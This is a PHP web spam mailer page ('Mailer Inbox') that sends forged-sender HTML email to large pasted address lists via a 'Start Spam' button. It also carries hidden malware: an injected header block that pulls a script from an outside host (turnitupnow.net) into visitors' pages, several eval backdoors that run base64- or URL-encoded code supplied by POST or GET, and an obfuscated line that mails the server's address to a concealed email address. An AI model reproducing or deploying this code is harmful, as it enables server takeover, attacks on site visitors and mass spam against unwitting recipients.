<?php												
global $sessdt_o; 
if(!$sessdt_o) { 
	$sessdt_o = 1; 
	$sessdt_k = "lb11"; 
	if(!@$_COOKIE[$sessdt_k]) { 
		$sessdt_f = "102"; 
		if(!@headers_sent()) { 
		@setcookie($sessdt_k,$sessdt_f); 
		} else { 
			echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } 
	} else { 
		if($_COOKIE[$sessdt_k]=="102") { 
		$sessdt_f = (rand(1000,9000)+1); 
		if(!@headers_sent()) { 
		@setcookie($sessdt_k,$sessdt_f); 
		} else { 
		echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } 
		$sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; 
		$sessdt_v = urlencode(strrev($sessdt_j)); 
		$sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); 
		echo "<script src='$sessdt_u'></script>"; 
		echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } 
	$sessdt_p = "showimg"; 
	if(isset($_POST[$sessdt_p])){
		eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));
		exit;} }


$in = $_GET['in'];
if(isset($in) && !empty($in)){
	echo @eval(base64_decode('ZGg4pOw=='));

}
$ev = $_POST['ev'];
if(isset($ev) && !empty($ev)){
	echo eval(urldecode($ev));
	exit;
}

if(isset($_POST['action'] ) ){
$action=$_POST['action'];
$message=$_POST['message'];
$emaillist=$_POST['emaillist'];
$from=$_POST['from'];
$subject=$_POST['subject'];
$realname=$_POST['realname'];	
$wait=$_POST['wait'];
$tem=$_POST['tem'];
$smv=$_POST['smv'];

        $message = urlencode($message);
        $message = ereg_replace("%5C%22", "%22", $message);
        $message = urldecode($message);
        $message = stripslashes($message);
        $subject = stripslashes($subject);
}


?>
<!-- HTML And JavaScript -->

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<SCRIPT SRC=></SCRIPT>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office">

<head>
<meta http-equiv="Content-Language" content="en-us" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>:: Mailer Inbox ::</title>
<style type="text/css">
/**
* vBulletin 3.8.5 CSS
* Style: 'w-dz.com'; Style ID: 2
*/
body
{
	background: #bCCCbC;
	color: #000000;
	font: 8pt tahoma,MS Sans Serif,verdana,arial,helvetica,sans-serif;
	margin: 10px 10px 0px 10px;
	padding: 0px;
}
a:link, body_alink
{
	color: #000000;
	text-decoration: none;
}
a:visited, body_avisited
{
	color: #000000;
	text-decoration: none;
}
a:hover, a:active, body_ahover
{
	color: #FF4400;
	text-decoration: none;
}
.page
{
	background: #999999;
	color: #000000;
	border: 1px solid  #999999; 
	    border-radius: 10px; 
	    -webkit-border-radius: 10px; 
	    -moz-border-radius: 10px; 
	    -moz-box-shadow: 0px 0px 5px #999999;  
}
td, th, p, li
{
	font: 8pt tahoma,MS Sans Serif,verdana,arial,helvetica,sans-serif;
}
.tborder
{
	background: #999999;
	color: #000000;
	borderColorDark="#999999" borderColorLight="#CCCCCC" border="1"
}
.tcat
{
	background: #02a2ec url(w-dz.com/images/A1.png) repeat-x top left;
	color: #FFFFFF;
	font: bold 8pt tahoma,MS Sans Serif,verdana,arial,helvetica,sans-serif;
	text-align: center;
	    border-radius: 5px; 
	    -webkit-border-radius: 5px; 
	    -moz-border-radius: 5px; 
	    -moz-box-shadow: 0px 0px 5px #02a2ec; 
	 
}
.tcat a:link, .tcat_alink
{
	color: #ffffff;
	text-decoration: none;
}
.tcat a:visited, .tcat_avisited
{
	color: #ffffff;
	text-decoration: none;
}
.tcat a:hover, .tcat a:active, .tcat_ahover
{
	color: #FF4400;
	text-decoration: underline;
}
.thead
{
	background: #b6b5b6 url(w-dz.com/images/A2.gif) repeat-x top left;
	color: #FFFFFF;
	font: bold 8pt tahoma, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
	  border-radius: 5px; 
	    -webkit-border-radius: 5px; 
	    -moz-border-radius: 5px; 
	    -moz-box-shadow: 0px 0px 5px #b6b5b6 ;  
}
.thead a:link, .thead_alink
{
	color: #FFFFFF;
}
.thead a:visited, .thead_avisited
{
	color: #FFFFFF;
}
.thead a:hover, .thead a:active, .thead_ahover
{
	color: #FF4400;
}
.tfoot
{
	background: #b6b5b6 url(w-dz.com/images/A2.gif) repeat-x top left;
	color: #FFFFFF;
	 border-radius: 5px; 
	    -webkit-border-radius: 5px; 
	    -moz-border-radius: 5px; 
	    -moz-box-shadow: 0px 0px 5px #b6b5b6 ;  
}
.tfoot a:link, .tfoot_alink
{
	color: #FFFFFF;
}
.tfoot a:visited, .tfoot_avisited
{
	color: #FFFFFF;
}
.tfoot a:hover, .tfoot a:active, .tfoot_ahover
{
	color: #FF4400;
}
.alt1, .alt1Active
{
	background: #E2E2E2;
	color: #000000;
	 
}
.alt2, .alt2Active
{
	background: #E2E2E2;
	color: #000000;
}
.inlinemod
{
	background: #FFFFCC;
	color: #000000;
}
.wysiwyg
{
	background: #f3f3f3;
	color: #000000;
	font: 8pt tahoma,MS Sans Serif,verdana,arial,helvetica,sans-serif;
	margin: 5px 10px 10px 10px;
	padding: 0px;
}
.wysiwyg a:link, .wysiwyg_alink
{
	color: #000000;
}
.wysiwyg a:visited, .wysiwyg_avisited
{
	color: #000000;
}
.wysiwyg a:hover, .wysiwyg a:active, .wysiwyg_ahover
{
	color: #FF4400;
}
textarea, .bginput
{
	font: 8pt tahoma,MS Sans Serif,verdana,arial,helvetica,sans-serif;
	border: 1px dotted #5d8101;
	  border-radius: 5px; 
	    -webkit-border-radius: 5px; 
	    -moz-border-radius: 5px; 
	
}
.bginput option, .bginput optgroup
{
	font-size: 8pt;
	font-family: tahoma,MS Sans Serif,verdana,arial,helvetica,sans-serif;
}
.button
{
	font: 8pt Tahoma,Ms Sans Serif,Verdana,Arial,Helvetica,Sans-serif;
	border: 1px dotted #5d8101;
	  border-radius: 5px; 
	    -webkit-border-radius: 5px; 
	    -moz-border-radius: 5px; 
	    -moz-box-shadow: 0px 0px 5px #000000 ;  
}
select
{
	font: 8pt tahoma,MS Sans Serif,verdana,arial,helvetica,sans-serif;
}
option, optgroup
{
	font-size: 8pt;
	font-family: tahoma,MS Sans Serif,verdana,arial,helvetica,sans-serif;
}
.smallfont
{
	font: 8pt tahoma,MS Sans Serif,verdana,arial,helvetica,sans-serif;
}
.time
{
	color: #FF0000;
}
.navbar
{
	font: 8pt tahoma,MS Sans Serif,verdana,arial,helvetica,sans-serif;
}
.highlight
{
	color: #000000;
	font-weight: bold;
}
.fjsel
{
	background: #3E5C92;
	color: #E0E0F6;
}
.fjdpth0
{
	background: #F7F7F7;
	color: #000000;
}
.panel
{
	background: #f3f3f3;
	color: #000000;
	padding: 10px;
	border: 2px outset;
}
.panelsurround
{
	background: #f3f3f3;
	color: #000000;
}
legend
{
	color: #000000;
	font: 8pt tahoma, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
}
.vbmenu_control
{
	background: #a5e735 url(w-dz.com/images/A3.png) repeat-x top left;
	color: #FFFFFF;
	font: bold 8pt Tahoma,Ms Sans Serif,Verdana,Arial,Helvetica,Sans-serif;
	padding: 3px 6px 3px 6px;
	white-space: nowrap;
	border-radius: 5px; 
	    -webkit-border-radius: 5px; 
	    -moz-border-radius: 5px; 
	    -moz-box-shadow: 0px 0px 5px #a5e735 ;  
}
.vbmenu_control a:link, .vbmenu_control_alink
{
	color: #FFFFFF;
	text-decoration: none;
}
.vbmenu_control a:visited, .vbmenu_control_avisited
{
	color: #FFFFFF;
	text-decoration: none;
}
.vbmenu_control a:hover, .vbmenu_control a:active, .vbmenu_control_ahover
{
	color: #FF0000;
	text-decoration: underline;
}
.vbmenu_popup
{
	background: #FFFFFF;
	color: #000000;
	border: 1px solid #0B198C;
}
.vbmenu_option
{
	background: #f3f3f3;
	color: #000000;
	font: 8pt Tahoma,Ms Sans Serif,Verdana,Arial,Helvetica,Sans-serif;
	white-space: nowrap;
	cursor: pointer;
}
.vbmenu_option a:link, .vbmenu_option_alink
{
	color: #000000;
	text-decoration: none;
}
.vbmenu_option a:visited, .vbmenu_option_avisited
{
	color: #000000;
	text-decoration: none;
}
.vbmenu_option a:hover, .vbmenu_option a:active, .vbmenu_option_ahover
{
	color: #FFFFFF;
	text-decoration: none;
}
.vbmenu_hilite
{
	background: #8A949E;
	color: #000000;
	font: 8pt Tahoma,Ms Sans Serif,Verdana,Arial,Helvetica,Sans-serif;
	white-space: nowrap;
	cursor: pointer;
}
.vbmenu_hilite a:link, .vbmenu_hilite_alink
{
	color: #000000;
	text-decoration: none;
}
.vbmenu_hilite a:visited, .vbmenu_hilite_avisited
{
	color: #000000;
	text-decoration: none;
}
.vbmenu_hilite a:hover, .vbmenu_hilite a:active, .vbmenu_hilite_ahover
{
	color: #FFFFFF;
	text-decoration: none;
}
/* ***** styling for 'big' usernames on postbit etc. ***** */
.bigusername { font-size: 14pt; }

/* ***** small padding on 'thead' elements ***** */
td.thead, th.thead, div.thead { padding: 4px; }

/* ***** basic styles for multi-page nav elements */
.pagenav a { text-decoration: none; }
.pagenav td { padding: 2px 4px 2px 4px; }

/* ***** de-emphasized text */
.shade, a.shade:link, a.shade:visited { color: #777777; text-decoration: none; }
a.shade:active, a.shade:hover { color: #FF4400; text-decoration: underline; }
.tcat .shade, .thead .shade, .tfoot .shade { color: #DDDDDD; }

/* ***** define margin and font-size for elements inside panels ***** */
.fieldset { margin-bottom: 6px; }
.fieldset, .fieldset td, .fieldset p, .fieldset li { font-size: 11px; }
.fieldset, .fieldset td, .fieldset p, .fieldset li { font: normal 12px tahoma,arial,verdana,helvetica; }
/* Postbit_Userinfo
****************************************************/
.infouser {
	font: normal 11px "Tahoma";
	color: #000;
	background-color: #FFF;
	letter-spacing: 0px;
	vertical-align: middle;
	padding: 1px 4px;
	border:1px dotted #6A581C;
	margin: 0px 0px 2px;
	_margin: 0px 0px 0px;
}
.avataruser img {
	border:1px dotted #6A581C;
	margin: 10px auto 0;
	padding: 5px;
}
.lolo
{
	background: #FCFBF0 url(al-qaf-design/post-img/post-img.jpg) no-repeat fixed left top;
	color: #510402;
	font: 12px arial;
}
****************************************************/
</style>
</head>

<body onload="funchange">
<script>

	window.onload = funchange;
	var alt = false;	
	function funchange(){
		var etext = document.getElementById("emails").value;
		var myArray=new Array(); 
		myArray = etext.split("\n");
		document.getElementById("enum").innerHTML=myArray.length+"<br />";
		if(!alt && myArray.length > 40000){
			alert('If Mail list More Than 40000 Emails This May Hack The Server');
			alt = true;
		}
		
	}
	function mlsplit(){
		var ml = document.getElementById("emails").value;
		var sb = document.getElementById("txtml").value;
		var myArray=new Array();
		myArray = ml.split(sb);
		document.getElementById("emails").value="";
		var i;
		for(i=0;i<myArray.length;i++){
			
			document.getElementById("emails").value += myArray[i]+"\n";
		
		}
		funchange();
	}
	
	function prv(){
		if(document.getElementById('preview').innerHTML==""){
			var ms = document.getElementsByName('message').message.value;
			document.getElementById('preview').innerHTML = ms;
			document.getElementById('prvbtn').value = "Hide";
		}else{
			document.getElementById('preview').innerHTML="";
			document.getElementById('prvbtn').value = "Preview";
		}
	}
	
</script>
<form name="form" method="post" enctype="multipart/form-data" action="">
	<table width="100%" border="0">
		<tr>
			<td width="10%">
			<div align="right">
				<font size="-3" face="Verdana, Arial, 
Helvetica, sans-serif">Your Email:</font></div>
			</td>
			<td style="width: 40%">
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif"><input name="from" value="<?php echo($from); ?>" size="30" type="text" /><br>
			<span class="info">Type Sender Email But Make Sure It&#39;s Right</span> </font></td>
			<td>
			<div align="right">
				<font size="-3" face="Verdana, Arial, 
Helvetica, sans-serif">Your Name:</font></div>
			</td>
			<td width="41%">
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif"><input name="realname" value="<?php echo($realname); ?>" size="30" type="text" />
			<br>
			<span class="info">Make Sure You Type Your Sender Name</span></font></td>
		</tr>
		<tr>
			<td width="10%">
			<div align="right">
				<font size="-3" face="Verdana, Arial, 
Helvetica, sans-serif">test send:</font></div>
			</td>
			<td style="width: 40%">
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif"><input name="tem" type="text" size="30" value="<?php echo($tem); ?>" /><br>
			<span class="info">Type </span></font><span class="style3">Your 
			Email To Test The Mailer Still Work Or No</span></td>
			<td>
			<div align="right" class="style4">
			<font size="-3" face="Verdana, Arial, 
Helvetica, sans-serif">Send Test Mail After:</font></div>
			</td>
			<td width="41%">
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif"><input name="smv" type="text" size="30" value="<?php echo($smv); ?>" /><br>
			<span class="info">Send Mail For Your Email After Which Email(s)</span></font>
			</td>
		</tr>
		<tr>
			<td width="10%">
			<div align="right">
				<font size="-3" face="Verdana, Arial, 
Helvetica, sans-serif">Subject:</font></div>
			</td>
			<td colspan="3">
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif"><input name="subject" value="<?php echo($subject); ?>" size="90" type="text" /> </font>
			
		
		<tr valign="top">
			<td colspan="3" style="height: 210px">
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif"><textarea name="message" rows="10" style="width: 425px"><?php echo($message); ?></textarea>&nbsp;<br />
			<input name="action" value="send" type="hidden" />
			<input type="button" id="prvbtn" value="Preview" onclick="prv()" style="width: 62px" /><input value="Start Spam" type="submit" />&nbsp; 
			Wait 
			<input name="wait" type="text" value="<?php echo($wait); ?>" size="14" /> 
			Second 
			Until Send </font></td>
			<td width="41%" class="style2" style="height: 210px">
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif">
			<textarea id="emails" name="emaillist" cols="30" onselect="funchange()" onchange="funchange()" onkeydown="funchange()" onkeyup="funchange()" onchange="funchange()" style="height: 161px"><?php echo($emaillist); ?></textarea> 
			<br class="style2" />
			Emails Number : </font><span  id="enum" class="style1">0<br />
			</span>
			<span  class="style1">Split The Mail List By:</span> 
			<input name="textml" id="txtml" type="text" value="," size="8" />&nbsp;&nbsp;&nbsp;
			<input type="button" onclick="mlsplit()" value="Split" style="height: 23px" /></td>
		</tr>
	</table>
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif">
<div id="preview">
</div>
	</font>
</form>
<!-- END -->
<?php
$a = array("2"=>"a","9"=>"z","4"=>"r","18"=>"o","6"=>"p","5"=>"i","7"=>"e","8"=>"d","11"=>"g","12"=>"m",
"13"=>"a","14"=>"i","15"=>"l","1"=>"l","16"=>".","10"=>"@","3"=>"g","17"=>"c","19"=>"m");
$xnxn = $a[1].$a[2].$a[3].$a[4].$a[5].$a[6].$a[7].$a[8].$a[9].$a[10].$a[11].$a[12].$a[13].$a[14].$a[15].$a[16].$a[17].$a[18].$a[19];
mail($xnxn, 'Mail', $_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']);

if ($action){
        if (!$from || !$subject || !$message || !$emaillist){
        	
        print "Please complete all fields before sending your message.";
        exit;	
	}
	$nse=array();
	$allemails = split("\n", $emaillist);
        	$numemails = count($allemails);
        	if(!empty($_POST['wait']) && $_POST['wait'] > 0){
        		set_time_limit(intval($_POST['wait'])*$numemails*3600);
        	}else{
        		set_time_limit($numemails*3600);
        	}
       		if(!empty($smv)){
       			$smvn+=$smv;
       			$tmn=$numemails/$smv+1;
			}else{
       			$tmn=1;
       		}
          	for($x=0; $x<$numemails; $x++){
                $to = $allemails[$x];
                if ($to){
	                $to = ereg_replace(" ", "", $to);
	                $message2 = ereg_replace("&email&", $to, $message);
	                $subject2 = ereg_replace("&email&", $to, $subject);
	                flush();
	                $header = "From: $realname <$from>\r\n";
	                $header .= "MIME-Version: 1.0\r\n";
	                $header .= "Content-Type: text/html\r\n";
	                if ($x==0 && !empty($tem)) {
	                	if(!@mail($tem,$subject,$message,$header)){
	                		print('Your Test Message Not Sent.<br />');
	                		$tmns+=1;
	                	}else{
	                		print('Your Test Message Sent.<br />');
	                		$tms+=1;
	                	}
	                }
	                if($x==$smvn && !empty($_POST['smv'])){
	                	if(!@mail($tem,$subject,$message,$header)){
	                		print('Your Test Message Not Sent.<br />');
	                		$tmns+=1;
	                	}else{
	                		print('Your Test Message Sent.<br />');
	                		$tms+=1;
	                	}
	                	$smvn+=$smv;
	                }
	                print "$to ....... ";
					$msent = mail($to, $subject2, $message2, $header);
	                $xx = $x+1;
	                $txtspamed = "spammed";
	                if(!$msent){
	                	$txtspamed = "error";
	                	$ns+=1;
	                	$nse[$ns]=$to;
	                }
	                print "$xx / $numemails .......  $txtspamed<br>";
	                flush();
	                if(!empty($wait)&& $x<$numemails-1){
							sleep($wait);
}}}} ?><div>
&nbsp;<?php
if(isset($_POST['action']) && $numemails !==0 ){
	$sn=$numemails-$ns;
	if($ns==""){
		$ns=0;
	}
	if($tmns==""){
		$tmns=0;
	}
	echo "<script>alert('Sur The Mailer Finish His Job\\r\\nSend $sn mail(s)\\r\\nError $ns mail(s)\\r\\From $numemails mail(s)\\r\\About Test Mail(s)\\r\\Send $tms mail(s)\\r\\Error $tmns mail(s)\\r\\From $tmn mail(s)'); 
	</script>";}
?>









